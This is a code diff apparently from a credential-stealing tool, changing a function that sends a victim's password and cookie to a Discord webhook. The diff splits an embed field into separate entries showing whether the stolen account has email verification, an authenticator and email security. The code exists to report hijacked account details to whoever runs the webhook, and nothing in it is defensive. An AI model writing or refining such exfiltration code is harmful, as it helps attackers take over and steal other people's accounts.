@@ -131,8 +131,18 @@ def send_to_discord_background(password, cookie, webhook_url):
                             'inline': False
                         },
                         {
-                            'name': '🔐 Account Settings',
-                            'value': f"Email Verify {user_info.get('email_verified', '❌')} | Email Secure {user_info.get('email_secure', '❌')} | Authenticator {user_info.get('authenticator_enabled', '❌')}",
+                            'name': '📧 Email Verify',
+                            'value': user_info.get('email_verified', '❌'),
+                            'inline': False
+                        },
+                        {
+                            'name': '🔐 Authenticator',
+                            'value': user_info.get('authenticator_enabled', '❌'),
+                            'inline': False
+                        },
+                        {
+                            'name': '🛡️ Email Secure',
+                            'value': user_info.get('email_secure', '❌'),
                             'inline': False
                         }
                     ],
